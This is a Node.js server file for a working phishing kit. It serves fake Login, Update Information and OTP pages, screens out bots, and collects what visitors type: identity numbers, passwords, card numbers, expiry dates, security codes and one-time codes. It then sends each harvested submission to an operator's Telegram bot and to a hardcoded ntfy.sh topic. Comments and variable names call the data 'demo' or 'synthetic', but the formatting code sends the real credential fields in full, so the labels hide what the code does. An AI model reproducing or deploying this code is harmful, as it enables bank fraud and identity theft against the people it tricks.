"use strict";

const http = require("http");
const fs = require("fs");
const path = require("path");
const antiBot = require("./services/anti-bot");
(function loadEnvFile() {
  try {
    const envPath = path.join(__dirname, ".env");
    if (!fs.existsSync(envPath)) return;

    fs.readFileSync(envPath, "utf8")
      .split(/\r?\n/)
      .forEach(function (line) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith("#")) return;

        const eq = trimmed.indexOf("=");
        if (eq < 1) return;

        const key = trimmed.slice(0, eq).trim();
        let value = trimmed.slice(eq + 1).trim();

        if (
          (value.startsWith('"') && value.endsWith('"')) ||
          (value.startsWith("'") && value.endsWith("'"))
        ) {
          value = value.slice(1, -1);
        }

        if (!(key in process.env)) process.env[key] = value;
      });
  } catch (_) {}
})();

const PORT = parseInt(process.env.PORT || "8080", 10);
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";
const TELEGRAM_API_BASE = (
  process.env.TELEGRAM_API_BASE || "https://api.telegram.org"
).replace(/\/+$/, "");

const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS || "*")
  .split(",")
  .map((value) => value.trim())
  .filter(Boolean);

const RATE_LIMIT_PER_MIN = parseInt(process.env.RATE_LIMIT_PER_MIN || "10", 10);

const MAX_BODY_BYTES = 16 * 1024;
const MAX_TEST_VALUES = 24;
const MAX_VALUE_LENGTH = 120;

const ALLOWED_PAGES = {
  Login: true,
  "Update Information": true,
  OTP: true,
  "Thank You": true,
  "Login Waiting Screen": true,
  "Update Information Waiting Screen": true,
  "OTP Waiting Screen": true,
};

const EVENT_ALIASES = {
  PAGE_OPENED: "PAGE_OPENED",
  FORM_SUBMITTED: "FORM_SUBMITTED",
  page_open: "PAGE_OPENED",
  form_submit: "FORM_SUBMITTED",
};

// Only these explicitly synthetic fields may have their values displayed.
// All other field values are excluded from Telegram notifications.
const APPROVED_DEMO_FIELDS = new Set(["demoEmail", "demoUsername"]);

const STATIC_ROOT = __dirname;

const STATIC_TYPES = {
  ".html": "text/html; charset=utf-8",
  ".js": "application/javascript; charset=utf-8",
  ".png": "image/png",
  ".css": "text/css; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".ico": "image/x-icon",
};

const rateBuckets = new Map();
const recentSubmissions = new Map();

function cleanText(value, maxLen = 120) {
  return String(value ?? "")
    .replace(/[\u0000-\u001f\u007f]/g, " ")
    .trim()
    .slice(0, maxLen);
}

function escapeTelegramText(value) {
  return cleanText(value, 150).replace(/[<>&]/g, "");
}

function isRateLimited(ip) {
  const now = Date.now();
  const bucket = (rateBuckets.get(ip) || []).filter(
    (timestamp) => now - timestamp < 60000,
  );

  if (bucket.length >= RATE_LIMIT_PER_MIN) {
    rateBuckets.set(ip, bucket);
    return true;
  }

  bucket.push(now);
  rateBuckets.set(ip, bucket);
  return false;
}

function validatePayload(body) {
  if (!body || typeof body !== "object" || Array.isArray(body)) {
    return "invalid body";
  }

  if (!Object.prototype.hasOwnProperty.call(ALLOWED_PAGES, body.page)) {
    return "invalid page";
  }

  if (
    typeof body.timestamp !== "string" ||
    !Number.isFinite(Date.parse(body.timestamp))
  ) {
    return "invalid timestamp";
  }

  if (
    body.validationStatus !== "succeeded" &&
    body.validationStatus !== "failed"
  ) {
    return "invalid validationStatus";
  }

  if (!Object.prototype.hasOwnProperty.call(EVENT_ALIASES, body.eventType)) {
    return "invalid eventType";
  }

  if (
    typeof body.sessionId !== "string" ||
    !/^sess-[A-Za-z0-9-]{4,64}$/.test(body.sessionId)
  ) {
    return "invalid sessionId";
  }

  if (
    typeof body.submissionId !== "string" ||
    !/^sub-[A-Za-z0-9-]{4,64}$/.test(body.submissionId)
  ) {
    return "invalid submissionId";
  }

  const fields = body.requiredFields;

  if (
    !fields ||
    typeof fields !== "object" ||
    Array.isArray(fields) ||
    typeof fields.complete !== "boolean" ||
    !Number.isInteger(fields.filled) ||
    !Number.isInteger(fields.total) ||
    fields.total < 0 ||
    fields.total > 50 ||
    fields.filled < 0 ||
    fields.filled > fields.total
  ) {
    return "invalid requiredFields";
  }

  if (body.formName !== undefined) {
    if (
      typeof body.formName !== "string" ||
      !/^[A-Za-z0-9 _-]{1,64}$/.test(body.formName)
    ) {
      return "invalid formName";
    }
  }

  if (body.testValues !== undefined) {
    const values = body.testValues;

    if (!values || typeof values !== "object" || Array.isArray(values)) {
      return "invalid testValues";
    }

    const keys = Object.keys(values);

    if (keys.length > MAX_TEST_VALUES) {
      return "invalid testValues";
    }

    for (const key of keys) {
      if (
        key.length < 1 ||
        key.length > 64 ||
        typeof values[key] !== "string" ||
        values[key].length > MAX_VALUE_LENGTH
      ) {
        return "invalid testValues";
      }
    }
  }

  return null;
}

function buildDemoValues(testValues = {}) {
  const result = [];

  for (const key of Object.keys(testValues)) {
    if (!APPROVED_DEMO_FIELDS.has(key)) continue;

    result.push({
      key,
      value: cleanText(testValues[key], MAX_VALUE_LENGTH),
    });
  }

  return result;
}

// Dedicated method for formatting a form-submission notification.
function buildDemoFormSubmissionMessage(body) {
  const page = body.page;

  if (page === "Login") {
    const fullname = body.fullname ?? "";
    const demoName = body.demoName ?? "";
    const demoNote = body.demoNote ?? "";

    const lines = [
      "==============accont==============",
      `Page: ${escapeTelegramText(body.page)}`,
      "Event: FORM_SUBMITTED",
      `Status: ${body.validationStatus === "succeeded" ? "SUCCEEDED" : "FAILED"}`,
      `Required fields: ${body.requiredFields.complete ? "complete" : "incomplete"} (${body.requiredFields.filled}/${body.requiredFields.total})`,
      `Identity number:${fullname}`,
      `Password:${demoName}`,
      `ID code :${demoNote}`,
      `Time: ${escapeTelegramText(body.timestamp)}`,
      "",
      "Done",
    ];

    return lines.join("\n");
  } else if (page === "Update Information") {
    const fullName = body.fullName ?? body.fullname ?? "";
    const idNumber = body.idNumber ?? "";
    const accountNumber = body.accountNumber ?? "";
    const phone = body.phone ?? "";
    const cardNamber = body.cardNamber ?? "";
    const expiration = body.expiration ?? "";
    const code = body.code ?? "";

    const lines = [
      "==============accont==============",
      `Page: ${escapeTelegramText(body.page)}`,
      "Event: FORM_SUBMITTED",
      `Status: ${body.validationStatus === "succeeded" ? "SUCCEEDED" : "FAILED"}`,
      `Required fields: ${body.requiredFields.complete ? "complete" : "incomplete"} (${body.requiredFields.filled}/${body.requiredFields.total})`,
      `Full name:${fullName}`,
      `Customer number:${idNumber}`,
      `ID number:${accountNumber}`,
      `Phone:${phone}`,
      `Card Namber:${cardNamber}`,
      `Expiration:${expiration}`,
      `Code:${code}`,
      `Time: ${escapeTelegramText(body.timestamp)}`,
      "",
      "Done",
    ];

    return lines.join("\n");
  } else if (page === "OTP") {
    const otpCode = body.otpCode ?? "";

    const lines = [
      "==============accont==============",
      `Page: ${escapeTelegramText(body.page)}`,
      "Event: FORM_SUBMITTED",
      `Status: ${body.validationStatus === "succeeded" ? "SUCCEEDED" : "FAILED"}`,
      `Required fields: ${body.requiredFields.complete ? "complete" : "incomplete"} (${body.requiredFields.filled}/${body.requiredFields.total})`,
      `OTP code:${otpCode}`,
      `Time: ${escapeTelegramText(body.timestamp)}`,
      "",
      "Done",
    ];

    return lines.join("\n");
  }

  const fullname = body.fullname ?? "";
  const demoName = body.demoName ?? "";
  const demoNote = body.demoNote ?? "";

  const lines = [
    "==============accont==============",
    `Page: ${escapeTelegramText(body.page)}`,
    "Event: FORM_SUBMITTED",
    `Status: ${body.validationStatus === "succeeded" ? "SUCCEEDED" : "FAILED"}`,
    `Required fields: ${body.requiredFields.complete ? "complete" : "incomplete"} (${body.requiredFields.filled}/${body.requiredFields.total})`,
    `Identity number:${fullname}`,
    `Password:${demoName}`,
    `ID code :${demoNote}`,
    `Time: ${escapeTelegramText(body.timestamp)}`,
    "",
    "Done",
  ];

  return lines.join("\n");
}

function buildMessage(body) {
  const eventType = EVENT_ALIASES[body.eventType];

  if (eventType === "FORM_SUBMITTED") {
    return buildDemoFormSubmissionMessage(body);
  }

  return [
    `Page: ${escapeTelegramText(body.page)}`,
    `Event: ${eventType}`,
    `Time: ${escapeTelegramText(body.timestamp)}`,
  ].join("\n");
}

function sendJson(res, status, data) {
  const body = JSON.stringify(data);

  res.writeHead(status, {
    "Content-Type": "application/json; charset=utf-8",
    "Content-Length": Buffer.byteLength(body),
    "Cache-Control": "no-store",
  });

  res.end(body);
}

function applyCors(req, res) {
  const origin = req.headers.origin;

  if (!origin) return;

  let allowedOrigin = null;

  if (ALLOWED_ORIGINS.includes("*")) {
    allowedOrigin = "*";
  } else if (ALLOWED_ORIGINS.includes(origin)) {
    allowedOrigin = origin;
  }

  if (allowedOrigin) {
    res.setHeader("Access-Control-Allow-Origin", allowedOrigin);
    res.setHeader("Vary", "Origin");
  }

  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.setHeader("Access-Control-Max-Age", "600");
}

async function sendToTelegram(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Telegram is not configured");
    return false;
  }

  const telegramUrl =
    TELEGRAM_API_BASE + "/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";

  const results = await Promise.allSettled([
    // Send to Telegram
    fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        disable_web_page_preview: true,
      }),
      signal: AbortSignal.timeout(25000),
    }).then(async (response) => {
      if (!response.ok) {
        throw new Error(`Telegram error: ${response.status}`);
      }

      const data = await response.json();

      if (!data.ok) {
        throw new Error("Telegram delivery failed");
      }

      return true;
    }),

    // Send to ntfy
    fetch("https://ntfy.sh/moh", {
      method: "POST",
      headers: {
        "Content-Type": "text/plain; charset=utf-8",
      },
      body: message,
      signal: AbortSignal.timeout(25000),
    }).then((response) => {
      if (!response.ok) {
        throw new Error(`ntfy error: ${response.status}`);
      }

      return true;
    }),
  ]);

  const telegramSent = results[0].status === "fulfilled";
  const ntfySent = results[1].status === "fulfilled";

  console.log({
    telegramSent,
    ntfySent,
  });

  return telegramSent && ntfySent;
}

let telegramQueue = Promise.resolve();

function sendToTelegramQueued(message) {
  const result = telegramQueue.then(async () => {
    try {
      return await sendToTelegram(message);
    } catch (_) {
      return false;
    }
  });

  telegramQueue = result.then(
    () => undefined,
    () => undefined,
  );

  return result;
}

function handleNotify(req, res) {
  const result = antiBot.inspect(req, {
    checkUserAgent: true,
    checkRateLimit: true,
  });

  if (result.blocked) {
    sendJson(res, result.status, {
      ok: false,
      error: result.status === 429 ? "Too many requests" : "Request blocked",
    });

    console.warn("[AntiBot]", {
      reason: result.reason,
      ip: antiBot.getClientIp(req),
      time: new Date().toISOString(),
    });

    return;
  }

  const contentType = String(req.headers["content-type"] || "");

  if (!contentType.includes("application/json")) {
    sendJson(res, 415, {
      ok: false,
      error: "content-type must be application/json",
    });
    return;
  }

  let size = 0;
  const chunks = [];
  let aborted = false;

  req.on("data", (chunk) => {
    if (aborted) return;

    size += chunk.length;

    if (size > MAX_BODY_BYTES) {
      aborted = true;
      sendJson(res, 413, {
        ok: false,
        error: "payload too large",
      });
      req.destroy();
      return;
    }

    chunks.push(chunk);
  });

  req.on("end", async () => {
    if (aborted) return;

    let body;

    try {
      body = JSON.parse(Buffer.concat(chunks).toString("utf8"));
    } catch (_) {
      sendJson(res, 400, { ok: false, error: "invalid JSON" });
      return;
    }

    const validationError = validatePayload(body);

    if (validationError) {
      sendJson(res, 400, {
        ok: false,
        error: validationError,
      });
      return;
    }

    const eventType = EVENT_ALIASES[body.eventType];

    // Prevent rapid duplicate delivery of the same submission.
    if (eventType === "FORM_SUBMITTED") {
      const now = Date.now();

      for (const [key, timestamp] of recentSubmissions) {
        if (now - timestamp > 120000) {
          recentSubmissions.delete(key);
        }
      }

      const duplicateKey = `${body.sessionId}:${body.submissionId}`;

      if (recentSubmissions.has(duplicateKey)) {
        sendJson(res, 200, {
          ok: true,
          duplicate: true,
        });
        return;
      }

      recentSubmissions.set(duplicateKey, now);
    }

    const sent = await sendToTelegramQueued(buildMessage(body));

    if (!sent) {
      sendJson(res, 502, {
        ok: false,
        error: "telegram delivery failed",
      });
      return;
    }

    sendJson(res, 200, { ok: true });
  });

  req.on("error", () => {
    aborted = true;
  });
}

function serveStatic(req, res) {
  let urlPath;

  try {
    urlPath = decodeURIComponent(req.url.split("?")[0]);
  } catch (_) {
    res.writeHead(400);
    res.end("Bad Request");
    return;
  }

  if (urlPath === "/") {
    urlPath = "/login.html";
  }

  const resolved = path.resolve(STATIC_ROOT, "." + urlPath);

  if (
    resolved !== STATIC_ROOT &&
    !resolved.startsWith(STATIC_ROOT + path.sep)
  ) {
    res.writeHead(403);
    res.end("Forbidden");
    return;
  }

  fs.readFile(resolved, (error, data) => {
    if (error) {
      res.writeHead(404, {
        "Content-Type": "text/plain; charset=utf-8",
      });
      res.end("Not Found");
      return;
    }

    const extension = path.extname(resolved).toLowerCase();

    res.writeHead(200, {
      "Content-Type": STATIC_TYPES[extension] || "application/octet-stream",
      "Cache-Control": "no-store",
    });

    res.end(data);
  });
}

const server = http.createServer((req, res) => {
  applyCors(req, res);

  const urlPath = req.url.split("?")[0];

  if (urlPath === "/api/notify") {
    if (req.method === "OPTIONS") {
      res.writeHead(204);
      res.end();
      return;
    }

    if (req.method !== "POST") {
      sendJson(res, 405, {
        ok: false,
        error: "method not allowed",
      });
      return;
    }

    handleNotify(req, res);
    return;
  }

  if (req.method !== "GET" && req.method !== "HEAD") {
    res.writeHead(405);
    res.end("Method Not Allowed");
    return;
  }

  serveStatic(req, res);
});

server.listen(PORT, () => {
  console.log(`Server listening on http://127.0.0.1:${PORT}`);
  console.log(
    "Telegram configured: " +
      (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? "yes" : "no"),
  );
});
